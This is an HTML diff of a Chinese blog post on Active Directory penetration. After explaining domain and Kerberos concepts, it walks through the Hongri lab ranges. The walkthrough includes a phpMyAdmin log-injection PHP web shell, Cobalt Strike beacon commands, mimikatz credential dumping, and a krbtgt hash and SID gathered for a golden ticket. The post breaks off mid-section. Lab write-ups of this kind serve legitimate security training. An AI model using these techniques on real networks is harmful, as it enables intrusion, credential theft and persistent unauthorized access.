@@ -1,0 +1,980 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="清风">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="域渗透基础与实战基本概念Windows工作组：对等网络，分散式管理，通过不通的账户实现局域网内多个计算机的使用，其添加方式简单，但规模及其有限、 域（domain）：单点登录，使用域账号即可访问域内任何资源，采用集中化管理，具有高度扩展性，可以建立多个域的信任关系 域控制器：负责用户与计算机之间的验证工作的计算机，域控包含了这个域的账户，密码，属于这个域的数据库，是活动目录的存储位置 活动目录（A">
+<meta property="og:type" content="article">
+<meta property="og:title" content="域渗透基础">
+<meta property="og:url" content="http://example.com/2025/09/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/index.html">
+<meta property="og:site_name" content="清风不识字">
+<meta property="og:description" content="域渗透基础与实战基本概念Windows工作组：对等网络，分散式管理，通过不通的账户实现局域网内多个计算机的使用，其添加方式简单，但规模及其有限、 域（domain）：单点登录，使用域账号即可访问域内任何资源，采用集中化管理，具有高度扩展性，可以建立多个域的信任关系 域控制器：负责用户与计算机之间的验证工作的计算机，域控包含了这个域的账户，密码，属于这个域的数据库，是活动目录的存储位置 活动目录（A">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/167.png">
+<meta property="article:published_time" content="2025-09-14T13:06:03.000Z">
+<meta property="article:modified_time" content="2026-01-26T15:15:32.262Z">
+<meta property="article:author" content="清风">
+<meta property="article:tag" content="域渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/167.png">
+  
+  
+  
+  <title>域渗透基础 - 清风不识字</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+<link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/lxgw-wenkai-screen-webfont/1.7.0/style.min.css">
+<link rel="stylesheet" href="/css/cloudedGlass.css">
+<link rel="stylesheet" href="/css/selection.css">
+<link rel="stylesheet" href="/css/macBorder.css">
+<link rel="stylesheet" href="https://jsd.cdn.zzko.cn/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
+<link rel="stylesheet" href="https://jsd.cdn.zzko.cn/gh/EmoryHuang/BlogBeautify@1.1/gradient.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"0JWcKtnJwUWPWRrrdTax0lya-gzGzoHsz","app_key":"Q6KrvNK2N7nNsewpWYVdjHuI","server_url":"https://0jwcktnj.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="清风不识字" type="application/atom+xml">
+</head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>清风不识字</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="域渗透基础"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-09-14 21:06" pubdate>
+          2025年9月14日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          23 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">域渗透基础</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2026年1月26日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="域渗透基础与实战"><a href="#域渗透基础与实战" class="headerlink" title="域渗透基础与实战"></a>域渗透基础与实战</h1><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p><strong>Windows工作组</strong>：对等网络，分散式管理，通过不通的账户实现局域网内多个计算机的使用，其添加方式简单，但规模及其有限、</p>
+<p><strong>域（domain）</strong>：单点登录，使用域账号即可访问域内任何资源，采用集中化管理，具有高度扩展性，可以建立多个域的信任关系</p>
+<p><strong>域控制器</strong>：负责用户与计算机之间的验证工作的计算机，域控包含了这个域的账户，密码，属于这个域的数据库，是活动目录的存储位置</p>
+<p><strong>活动目录（Active Directory）</strong>：活动目录是微软Windows Server中们负责架构中大型网络环境集中式目录管理服务，域内的计算机共享一个活动目录数据库，包含了整个域的对象和安全信息，活动目录负责目录数据库的添加，修改，更新和删除</p>
+<h3 id="域、域树、林、组织单元"><a href="#域、域树、林、组织单元" class="headerlink" title="域、域树、林、组织单元"></a>域、域树、林、组织单元</h3><p><img src="https://img2018.cnblogs.com/blog/1495876/201903/1495876-20190322203838929-1187525274.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><strong>域树：</strong>用域组成的结构树，域树中存在一个根域，往下则有子域</p>
+<p><strong>林：</strong>是由一棵或者多棵树组成，不同域树独享连续的命名空间</p>
+<p><strong>组织单元：</strong>是活动目录中的容器，可以理解为文件夹，包含域中的具体对象</p>
+<h3 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h3><p>基本域信息</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell">chcp <span class="hljs-number">65001</span>  <span class="hljs-comment">#解决乱码</span><br>whoami /all    <span class="hljs-comment"># 查看当前用户权限</span><br>net user /domain    <span class="hljs-comment"># 获取域用户列表</span><br>net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;Domain Admins&quot;</span> /domain    <span class="hljs-comment"># 获取域管理员信息</span><br>net config workstation    <span class="hljs-comment"># 查看域名</span><br>nltest /dclist:example.com    <span class="hljs-comment"># 获取域控服务器列表</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">dsquery server    <span class="hljs-comment"># 查找域控制器</span><br>dsquery user <span class="hljs-literal">-name</span> *    <span class="hljs-comment"># 获取所有用户</span><br></code></pre></td></tr></table></figure>
+
+<p>查找域控</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">nslookup <span class="hljs-literal">-querytype</span>=SRV _ldap._tcp.dc._msdcs.example.com<br>nltest /dclist:example.com<br></code></pre></td></tr></table></figure>
+
+<p>查看域内及其列表</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">view</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="红日靶场（一）"><a href="#红日靶场（一）" class="headerlink" title="红日靶场（一）"></a>红日靶场（一）</h3><p>内网扫描本地存活网段</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -PR -n -sn <span class="hljs-number">192.168.190.0</span>/<span class="hljs-number">24</span><br><span class="hljs-comment">#-PR 基于arp协议的主机扫描</span><br><span class="hljs-comment">#-n 不进行反向DNS，提高扫描速度</span><br><span class="hljs-comment">#-sn 跳过端口扫描，只确认是否在线</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/photo/image-20251108195239978.png" srcset="/img/loading.gif" lazyload alt="image-20251108195239978"></p>
+<p>找到靶机</p>
+<p>用nmap 扫描端口,发现80端口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sS -sV -sC -Pn -n -p <span class="hljs-number">1</span>-<span class="hljs-number">65535</span> <span class="hljs-number">192.168.190.149</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/photo/image-20251108200227434.png" srcset="/img/loading.gif" lazyload alt="image-20251108200227434"></p>
+<p>扫描一下目录，发现有phpmyadmin</p>
+<p><img src="/img/photo/image-20251108200644192.png" srcset="/img/loading.gif" lazyload alt="image-20251108200644192"></p>
+<p>弱口令登录</p>
+<p><img src="/img/photo/image-20251108200858687.png" srcset="/img/loading.gif" lazyload alt="image-20251108200858687"></p>
+<p>尝试phpmyadmin日志注入，绝对路径已经由phpinfo得到</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> general_log<span class="hljs-operator">=</span><span class="hljs-keyword">on</span>;<br><span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> general_log_file<span class="hljs-operator">=</span><span class="hljs-string">&#x27;C:/phpStudy/WWW/hack.php&#x27;</span><br><span class="hljs-keyword">SELECT</span> &quot;&lt;?php @eval($_POST[&#x27;hack&#x27;]);?&gt;&quot;;<br></code></pre></td></tr></table></figure>
+
+<p>蚁剑链接</p>
+<p><img src="/img/photo/image-20251108202601397.png" srcset="/img/loading.gif" lazyload alt="image-20251108202601397"></p>
+<p>发现具有administrator权限</p>
+<p><img src="/img/photo/image-20251108202703059.png" srcset="/img/loading.gif" lazyload alt="image-20251108202703059"></p>
+<p>上传木马</p>
+<p><img src="/img/photo/image-20251108203752797.png" srcset="/img/loading.gif" lazyload alt="image-20251108203752797"></p>
+<p><img src="/img/photo/image-20251108204642654.png" srcset="/img/loading.gif" lazyload alt="image-20251108204642654"></p>
+<p>执行，可以看到主机成功上线</p>
+<p><img src="/img/photo/image-20251108204732097.png" srcset="/img/loading.gif" lazyload alt="image-20251108204732097"></p>
+<p>提权</p>
+<p><img src="/img/photo/image-20251108205226341.png" srcset="/img/loading.gif" lazyload alt="image-20251108205226341"></p>
+<p>csbeacon命令</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs gams">beacon&gt; help<br> <br>Beacon Commands<br>===============<br> <br>    Command                   Description<br>    -------                   -----------<br>    browserpivot              注入受害者浏览器进程<br>    bypassuac                 绕过UAC<br>    cancel                    取消正在进行的下载<br>    cd                        切换目录<br>    checkin                   强制让被控端回连一次<br>    clear                     清除beacon内部的任务队列<br>    connect                   Connect to a Beacon peer over TCP<br>    covertvpn                 部署Covert VPN客户端<br>    cp                        复制文件<br>    dcsync                    从DC中提取密码哈希<br>    desktop                   远程VNC<br>    dllinject                 反射DLL注入进程<br>    dllload                   使用LoadLibrary将DLL加载到进程中<br>    download                  下载文件<br>    downloads                 列出正在进行的文件下载<br>    drives                    列出目标盘符<br>    elevate                   尝试提权<br>    execute                   在目标上执行程序(无输出)<br>    execute-assembly          在目标上内存中执行本地.NET程序<br>    exit                      退出beacon<br>    getprivs                  Enable <span class="hljs-keyword">system</span> privileges on current token<br>    getsystem                 尝试获取<span class="hljs-keyword">SYSTEM</span>权限<br>    getuid                    获取用户ID<br>    hashdump                  转储密码哈希值<br>    help                      帮助<br>    inject                    在特定进程中生成会话<br>    <span class="hljs-built_in">jobkill</span>                   杀死一个后台任务<br>    jobs                      列出后台任务<br>    kerberos_ccache_use       从ccache文件中导入票据应用于此会话<br>    kerberos_ticket_purge     清除当前会话的票据<br>    kerberos_ticket_use       从ticket文件中导入票据应用于此会话<br>    keylogger                 键盘记录<br>    kill                      结束进程<br>    link                      Connect to a Beacon peer over a named pipe<br>    logonpasswords            使用mimikatz转储凭据和哈希值<br>    ls                        列出文件<br>    make_token                创建令牌以传递凭据<br>    mimikatz                  运行mimikatz<br>    mkdir                     创建一个目录<br>    mode dns                  使用DNS A作为通信通道(仅限DNS beacon)<br>    mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)<br>    mode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)<br>    mode http                 使用HTTP作为通信通道<br>    mv                        移动文件<br>    net                       net命令<br>    note                      备注       <br>    portscan                  进行端口扫描<br>    powerpick                 通过Unmanaged PowerShell执行命令<br>    powershell                通过powershell.exe执行命令<br>    powershell-import         导入powershell脚本<br>    ppid                      <span class="hljs-keyword">Set</span> parent <span class="hljs-comment">PID for spawned post-ex jobs</span><br>    ps                        显示进程列表<br>    psexec                    <span class="hljs-comment">Use a service to spawn a session on a host</span><br>    psexec_psh                <span class="hljs-comment">Use PowerShell to spawn a session on a host</span><br>    psinject                  在特定进程中执行<span class="hljs-comment">PowerShell</span>命令<br>    pth                       使用<span class="hljs-comment">Mimikatz</span>进行传递哈希<br>    pwd                       当前目录位置<br>    reg                       <span class="hljs-comment">Query the registry</span><br>    rev2self                  恢复原始令牌<br>    rm                        删除文件或文件夹<br>    rportfwd                  端口转发<br>    run                       在目标上执行程序<span class="hljs-comment">(</span>返回输出<span class="hljs-comment">)</span><br>    runas                     以另一个用户权限执行程序<br>    runasadmin                在高权限下执行程序<br>    runu                      <span class="hljs-comment">Execute a program under another PID</span><br>    screenshot                屏幕截图<br>    setenv                    设置环境变量<br>    shell                     <span class="hljs-comment">cmd</span>执行命令<br>    shinject                  将<span class="hljs-comment">shellcode</span>注入进程<br>    shspawn                   生成进程并将<span class="hljs-comment">shellcode</span>注入其中<br>    sleep                     设置睡眠延迟时间<br>    socks                     启动<span class="hljs-comment">SOCKS4</span>代理<br>    socks <span class="hljs-comment">stop</span>                停止<span class="hljs-comment">SOCKS4</span><br>    spawn                     <span class="hljs-comment">Spawn a session</span> <br>    spawnas                   <span class="hljs-comment">Spawn a session as another user</span><br>    spawnto                   <span class="hljs-comment">Set executable to spawn processes into</span><br>    spawnu                    <span class="hljs-comment">Spawn a session under another PID</span><br>    ssh                       使用<span class="hljs-comment">ssh</span>连接远程主机<br>    ssh-key                   使用密钥连接远程主机<br>    steal_token               从进程中窃取令牌<br>    timestomp                 将一个文件时间戳应用到另一个文件<br>    unlink                    <span class="hljs-comment">Disconnect from parent Beacon</span><br>    upload                    上传文件<br>    wdigest                   使用<span class="hljs-comment">mimikatz</span>转储明文凭据<br>    winrm                     使用<span class="hljs-comment">WinRM</span>在主机上生成会话<br>    wmi                       使用<span class="hljs-comment">WMI</span>在主机上生成会话<br>    ﻿argue                    进程参数欺骗<br></code></pre></td></tr></table></figure>
+
+<p>获取密码凭证</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">logonpasswords</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/photo/image-20251108210155946.png" srcset="/img/loading.gif" lazyload alt="image-20251108210155946"></p>
+<p>net view查看域内主机</p>
+<p><img src="/img/photo/image-20251109153716866.png" srcset="/img/loading.gif" lazyload alt="image-20251109153716866"></p>
+<p>使用nmap 扫描内网资源，发现两台主机</p>
+<p><img src="/img/photo/image-20251108210551718.png" srcset="/img/loading.gif" lazyload alt="image-20251108210551718"></p>
+<p>对其中一台端口扫描，有445端口</p>
+<p><img src="/img/photo/image-20251109153052814.png" srcset="/img/loading.gif" lazyload alt="image-20251109153052814"></p>
+<p>尝试进行永恒之蓝利用，使用CS内置的psexes模块</p>
+<p><img src="/img/photo/image-20251109153551912.png" srcset="/img/loading.gif" lazyload alt="image-20251109153551912"></p>
+<h3 id="红日靶场（二）"><a href="#红日靶场（二）" class="headerlink" title="红日靶场（二）"></a>红日靶场（二）</h3><h4 id="一、黄金票据"><a href="#一、黄金票据" class="headerlink" title="一、黄金票据"></a>一、黄金票据</h4><p><strong>Kerberos认证协议</strong>：Windows域环境用于身份验证的默认协议，通过三方认证确保身份合法性</p>
+<p><strong>KDC</strong>：密钥分发中心，包含AS(身份认证服务)、TGS(票据授权服务)两个子服务</p>
+<p><strong>TGT</strong>：票据授予票据、客户端向AS申请的临时身份凭证、后续向TGS申请访问具体服务的权限，由krbtgt账户的哈希加密</p>
+<p><strong>ST</strong>：服务票据、用于访问特定服务的门票，由目标服务密码哈希加密</p>
+<p><strong>Session key</strong>：会话密钥，由KDC生成的临时对称密钥，用于服务端和客户端的之间的安全通信</p>
+<p><strong>Authenticator</strong>：验证器，用sessionkey加密的时间戳，用于证明票据拥有者</p>
+<p><strong>KRBTGT账户</strong>：域内的内置账户，用于加密&#x2F;解密TGT</p>
+<h5 id="验证流程"><a href="#验证流程" class="headerlink" title="验证流程"></a>验证流程</h5><p>1.客户端输入账号密码后，KDC响应生成session key 和TGT，TGT包含session key,KDC对这两个都行进行加密，数据包返回给客户端，TGT用krbtgt密码hash，sessionkey用用户密码hash</p>
+<p>2.访问特定服务时，客户端把TGT和Authenticator(由sessionkey加密的时间戳)一起发给TGS，TGS,TGS解密TGT后获得sessionkey,用sessionkey解密Authenticator,验证身份，然后生成一个由服务密钥加密的服务票据和一个新的服务会话密钥，从而拿到访问目标服务的专属门票</p>
+<p><img src="/img/photo/image-20260107203824944.png" srcset="/img/loading.gif" lazyload alt="image-20260107203824944"></p>
+<p>3.客户端将服务票据与用服务会话密钥加密的新验证器发送给目标服务，服务端用自己的密钥解密服务票据，提取密钥解密验证器，确认身份后授权访问</p>
+<p><img src="/img/photo/image-20260107204139889.png" srcset="/img/loading.gif" lazyload alt="image-20260107204139889"></p>
+<p><strong>黄金票据原理：</strong>通过掌控krbtgt用户的hash，来伪造tgt，来冒充域内任何用户</p>
+<p><strong>攻击前提：</strong>获得域的SID，krbtgt用户的ntml哈希</p>
+<p><strong>攻击实施</strong>：伪造tgt</p>
+<p>内网网段扫描</p>
+<p><img src="/img/photo/image-20260107164056041.png" srcset="/img/loading.gif" lazyload alt="image-20260107164056041"></p>
+<p>对154主机进行端口探测</p>
+<p>发现7001端口有weblogic开放，工具写码</p>
+<p><img src="/img/photo/image-20260107165521300.png" srcset="/img/loading.gif" lazyload alt="image-20260107165521300"></p>
+<p>哥斯拉连接</p>
+<p><img src="/img/photo/image-20260107165713131.png" srcset="/img/loading.gif" lazyload alt="image-20260107165713131"></p>
+<p>上线CS，开始收集信息</p>
+<p>查看域管理员用户</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">shell net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;domain</span> admins<span class="hljs-string">&quot; /domain  </span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/photo/image-20260107172712423.png" srcset="/img/loading.gif" lazyload alt="image-20260107172712423"></p>
+<p>查看其他主机名</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">shell net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;domain</span> computers<span class="hljs-string">&quot; /domain</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/photo/image-20260107173039180.png" srcset="/img/loading.gif" lazyload alt="image-20260107173039180"></p>
+<p>获取机器ip地址</p>
+<p><img src="/../../themes/fluid/source/img/photo/image-20260107173229248.png" srcset="/img/loading.gif" lazyload alt="image-20260107173229248"></p>
+<p>抓取明文密码</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">mimikatz sekurlsa::logonpasswords<br>mimikatz kerberos::purge  <span class="hljs-comment">//清空已有票据</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/photo/image-20260107173834538.png" srcset="/img/loading.gif" lazyload alt="image-20260107173834538"></p>
+<p>开始横向</p>
+<p><img src="/img/photo/image-20260107192711448.png" srcset="/img/loading.gif" lazyload alt="image-20260107192711448"></p>
+<p><strong>权限维持</strong></p>
+<p><strong>黄金票据</strong></p>
+<p>抓取hashdump，获取ntlm值</p>
+<p><img src="/img/photo/image-20260108182100034.png" srcset="/img/loading.gif" lazyload alt="image-20260108182100034"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">krbtgt</span>:<span class="hljs-number">502</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">82</span>dfc71b72a11ef37d663047bc2088fb:::<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/photo/image-20260108182405129.png" srcset="/img/loading.gif" lazyload alt="image-20260108182405129"></p>
+<p>获取Administrator的SID值</p>
+<p><img src="/img/photo/image-20260108193714212.png" srcset="/img/loading.gif" lazyload alt="image-20260108193714212"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">de1ay</span>\administrator S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">2756371121</span>-<span class="hljs-number">2868759905</span>-<span class="hljs-number">3853650604</span>-<span class="hljs-number">500</span><br></code></pre></td></tr></table></figure>
+
+<p>清空已有票据，如果有域成员凭证会影响凭证伪造</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mimikatz kerberos::purge<br></code></pre></td></tr></table></figure>
+
+<p>生成票据前，查看域权限，可以看到无法访问</p>
